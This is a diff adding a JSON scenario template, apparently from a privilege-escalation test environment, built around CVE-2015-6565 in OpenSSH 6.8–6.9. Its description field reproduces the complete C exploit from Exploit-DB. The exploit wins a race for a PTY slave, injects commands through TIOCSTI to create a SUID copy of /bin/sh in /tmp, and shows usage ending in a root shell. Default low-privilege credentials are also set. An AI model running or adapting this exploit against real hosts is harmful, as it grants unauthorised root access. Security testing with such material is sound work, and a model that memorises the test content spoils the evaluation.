@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41173",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation (CVE-2015-6565)\n\nExploit source code (41173.c):\n```\n/*\n *  not_an_sshnuke.c\n *\n *  Federico Bento\n *\n *  up201407890 () alunos dcc fc up pt\n *  https://twitter.com/uid1000\n *\n *  OpenSSH 6.8-6.9 local privilege escalation - CVE-2015-6565\n *\n *  Considered mostly to be a \"DoS\", turns out to be a priv esc vuln.\n *  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6565\n *\n *  Shoutz to Jann Horn for the detailed analysis\n *  And also to all my elite colleagues, specially xSTF :)\n *\n *\n *  $ gcc not_an_sshnuke.c -o not_an_sshnuke\n *  $ ./not_an_sshnuke /dev/pts/3\n *  [*] Waiting for slave device /dev/pts/3\n *  [+] Got PTY slave /dev/pts/3\n *  [+] Making PTY slave the controlling terminal\n *  [+] SUID shell at /tmp/sh\n *  $ /tmp/sh --norc --noprofile -p\n *  # id\n *  euid=0(root) groups=0(root)\n *\n */\n\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/ioctl.h>\n\nint main(int argc, char *argv[])\n{\n     char *cmd = \"cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\\n\";\n     int pid, pts = -1;\n\n     if(argc != 2) {\n          fprintf(stderr, \"Usage: %s /dev/pts/X\\n\", argv[0]);\n\t  fprintf(stderr, \"Where X is next slave device to be created\\n\");\n\t  return 1;\n     }\n\n     if(!access(argv[1], F_OK)) {\n          fprintf(stderr, \"[-] %s device already exists\\n\", argv[1]);\n          return 1;\n     }\n\n     pid = fork();\n\n     if(pid < 0) {\n\t  fprintf(stderr, \"[-] fork failed\\n\");\n\t  return 1;\n     }\n\n     if(pid == 0) {\n          printf(\"[*] Waiting for slave device %s\\n\", argv[1]);\n\n\t  /* win the race by opening the PTY slave before sshd's child */\n\t  while(pts == -1)\n\t       pts = open(argv[1], O_WRONLY);\n\n\t       printf(\"[+] Got PTY slave %s\\n\", argv[1]);\n               printf(\"[+] Making PTY slave the controlling terminal\\n\");\n\n\t       dup2(pts, 0); dup2(pts, 1); dup2(pts, 2);\n\t       setsid();\n               ioctl(0, TIOCSCTTY, 1);\n\n\t       while(*cmd)\n\t            ioctl(0, TIOCSTI, cmd++);\n     }\n\n     else {\n          wait(NULL);\n\t  printf(\"[+] SUID shell at /tmp/sh\\n\");\n\t  return 0;\n     }\n}\n```",
+  "cve": "CVE-2015-6565",
+  "exploitdb_id": "41173",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41173",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
